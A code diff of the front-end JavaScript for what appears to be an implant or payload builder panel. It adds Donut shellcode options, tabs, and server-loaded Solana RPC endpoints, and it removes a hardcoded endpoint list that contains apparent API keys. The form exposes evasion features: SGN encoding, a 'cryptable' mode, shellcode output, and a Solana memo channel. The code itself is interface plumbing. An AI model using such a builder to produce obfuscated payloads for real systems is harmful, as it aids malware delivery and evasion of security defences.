@@ -2,7 +2,6 @@ import { createBuildProfileManager } from "./build-profile-manager.js";
 import {
   createBuildHistoryManager,
   formatFileSize,
-  updateExpirationTimer,
 } from "./build-history-manager.js";
 
 const form = document.getElementById("build-form");
@@ -53,6 +52,20 @@ let currentUserRole = null;
 let currentUsername = null;
 let showAllBuilds = false;
 let buildPlugins = [];
+
+async function loadSolRpcEndpoints() {
+  const field = document.getElementById("sol-rpc-endpoints");
+  if (!field || field.value.trim()) return;
+  try {
+    const res = await fetch("/api/sol/rpc-endpoints", { credentials: "include" });
+    if (!res.ok) return;
+    const data = await res.json();
+    const endpoints = Array.isArray(data?.endpoints)
+      ? data.endpoints.map((item) => String(item || "").trim()).filter(Boolean)
+      : [];
+    field.value = endpoints.join("\n");
+  } catch {}
+}
 
 async function loadServerVersion() {
   try {
@@ -139,6 +152,35 @@ function initAccordions() {
   });
 }
 
+function initBuilderTabs() {
+  const tabs = document.querySelectorAll(".builder-tab[data-builder-tab]");
+  const panels = document.querySelectorAll("[data-builder-panel]");
+
+  function switchTab(tabName) {
+    tabs.forEach((t) => {
+      t.setAttribute("aria-selected", t.dataset.builderTab === tabName ? "true" : "false");
+    });
+    panels.forEach((p) => {
+      if (p.dataset.builderPanel === tabName) {
+        p.removeAttribute("hidden");
+      } else {
+        p.setAttribute("hidden", "");
+      }
+    });
+  }
+
+  tabs.forEach((tab) => {
+    tab.addEventListener("click", () => {
+      switchTab(tab.dataset.builderTab);
+    });
+  });
+
+  const defaultTab = document.querySelector('.builder-tab[aria-selected="true"]');
+  if (defaultTab) {
+    switchTab(defaultTab.dataset.builderTab);
+  }
+}
+
 function updateWindowsSectionVisibility() {
   const windowsSection = document.getElementById("windows-settings-section");
   if (!windowsSection) return;
@@ -179,6 +221,11 @@ function collectBuildPluginSettings() {
 function setBuildField(field, value) {
   const fieldMap = {
     useDonut: "#donut-mode",
+    donutSingleThreaded: "#donut-single-threaded",
+    donutExitMode: "#donut-exit-mode",
+    donutEntropy: "#donut-entropy",
+    donutPreserveHeaders: "#donut-preserve-headers",
+    donutResumeOffset: "#donut-resume-offset",
     useLinuxShellcode: "#linux-shellcode-mode",
     shellcodeConsole: "#shellcode-console",
     useSgn: "#sgn-mode",
@@ -487,6 +534,11 @@ function collectFormSettings() {
     outputExtension: document.getElementById("output-extension")?.value ?? ".exe",
     cryptableMode: document.getElementById("cryptable-mode")?.checked ?? false,
     useDonut: document.getElementById("donut-mode")?.checked ?? false,
+    donutSingleThreaded: document.getElementById("donut-single-threaded")?.checked ?? false,
+    donutExitMode: parseInt(document.getElementById("donut-exit-mode")?.value, 10) || undefined,
+    donutEntropy: parseInt(document.getElementById("donut-entropy")?.value, 10) || undefined,
+    donutPreserveHeaders: document.getElementById("donut-preserve-headers")?.checked ?? false,
+    donutResumeOffset: parseInt(document.getElementById("donut-resume-offset")?.value, 10) || undefined,
     useLinuxShellcode: document.getElementById("linux-shellcode-mode")?.checked ?? false,
     shellcodeConsole: document.getElementById("shellcode-console")?.checked ?? false,
     useSgn: document.getElementById("sgn-mode")?.checked ?? false,
@@ -564,6 +616,11 @@ function applyFormSettings(settings) {
     setCb("#donut-mode", settings.useDonut);
     if (settings.useDonut) applyDonutMode(true);
   }
+  if (settings.donutSingleThreaded !== undefined) setCb("#donut-single-threaded", settings.donutSingleThreaded);
+  if (settings.donutExitMode !== undefined) setVal("donut-exit-mode", settings.donutExitMode);
+  if (settings.donutEntropy !== undefined) setVal("donut-entropy", settings.donutEntropy);
+  if (settings.donutPreserveHeaders !== undefined) setCb("#donut-preserve-headers", settings.donutPreserveHeaders);
+  if (settings.donutResumeOffset !== undefined) setVal("donut-resume-offset", settings.donutResumeOffset);
   if (settings.useLinuxShellcode !== undefined) {
     setCb("#linux-shellcode-mode", settings.useLinuxShellcode);
     if (settings.useLinuxShellcode) applyLinuxShellcodeMode(true);
@@ -836,6 +893,7 @@ function applyLinuxShellcodeMode(enabled) {
 
 restoreFormSettings();
 initAccordions();
+initBuilderTabs();
 loadBuildPlugins();
 updateWindowsSectionVisibility();
 updateShellcodeCheckboxVisibility();
@@ -938,22 +996,7 @@ if (solMemoCheckbox && solSettings) {
       updateServerUrlPlaceholder();
     }
 
-    if (isSol) {
-      const rpcField = document.getElementById("sol-rpc-endpoints");
-      if (rpcField && !rpcField.value.trim()) {
-        rpcField.value = [
-          "https://api.mainnet-beta.solana.com",
-          "https://solana-mainnet.gateway.tatum.io",
-          "https://go.getblock.us/86aac42ad4484f3c813079afc201451c",
-          "https://solana-rpc.publicnode.com",
-          "https://api.blockeden.xyz/solana/KeCh6p22EX5AeRHxMSmc",
-          "https://solana.drpc.org",
-          "https://solana.leorpc.com/?api_key=FREE",
-          "https://solana.api.onfinality.io/public",
-          "https://solana.api.pocket.network/",
-        ].join("\n");
-      }
-    }
+    if (isSol) loadSolRpcEndpoints();
   });
 }
 
@@ -1635,6 +1678,7 @@ async function init() {
     }
 
     await loadServerVersion();
+    await loadSolRpcEndpoints();
     await loadSavedBuilds();
     await loadBuildProfiles();
 
@@ -1786,6 +1830,11 @@ form?.addEventListener("submit", async (e) => {
       : undefined,
     iosBundleId: platforms.some(p => p.startsWith('ios-')) ? (form.querySelector("#ios-bundle-id")?.value.trim() || undefined) : undefined,
     useDonut: document.getElementById("donut-mode")?.checked || false,
+    donutSingleThreaded: document.getElementById("donut-single-threaded")?.checked || false,
+    donutExitMode: parseInt(document.getElementById("donut-exit-mode")?.value, 10) || undefined,
+    donutEntropy: parseInt(document.getElementById("donut-entropy")?.value, 10) || undefined,
+    donutPreserveHeaders: document.getElementById("donut-preserve-headers")?.checked || false,
+    donutResumeOffset: parseInt(document.getElementById("donut-resume-offset")?.value, 10) || undefined,
     useLinuxShellcode: document.getElementById("linux-shellcode-mode")?.checked || false,
     shellcodeConsole: document.getElementById("shellcode-console")?.checked || false,
     useSgn: document.getElementById("sgn-mode")?.checked || false,
@@ -2259,7 +2308,8 @@ function showBuildFiles(files, buildId, expiresAt) {
   const timer = document.createElement("span");
   timer.id = "expiration-timer";
   timer.className = "text-yellow-400 font-medium";
-  timer.dataset.expires = String(expiresAt);
+  timer.dataset.controller = "countdown";
+  timer.dataset.countdownExpiresAtValue = String(expiresAt);
   timer.textContent = "Calculating...";
   right.appendChild(clockIcon);
   right.appendChild(expiresLabel);
@@ -2269,9 +2319,6 @@ function showBuildFiles(files, buildId, expiresAt) {
   infoRow.appendChild(right);
   buildInfoDiv.appendChild(infoRow);
   buildFilesDiv.appendChild(buildInfoDiv);
-
-  updateExpirationTimer(timer, expiresAt);
-  setInterval(() => updateExpirationTimer(timer, expiresAt), 60000);
 
   files.forEach((file) => {
     const fileDiv = document.createElement("div");
@@ -2294,6 +2341,7 @@ function showBuildFiles(files, buildId, expiresAt) {
 
     const downloadBtn = document.createElement("a");
     downloadBtn.href = `/api/build/download/${encodeURIComponent(file.name)}`;
+    downloadBtn.download = "";
     downloadBtn.className =
       "inline-flex items-center gap-1 px-3 py-1 rounded bg-blue-600 hover:bg-blue-700 text-white text-sm transition-colors";
     downloadBtn.innerHTML = '<i class="fa-solid fa-download"></i> Download';
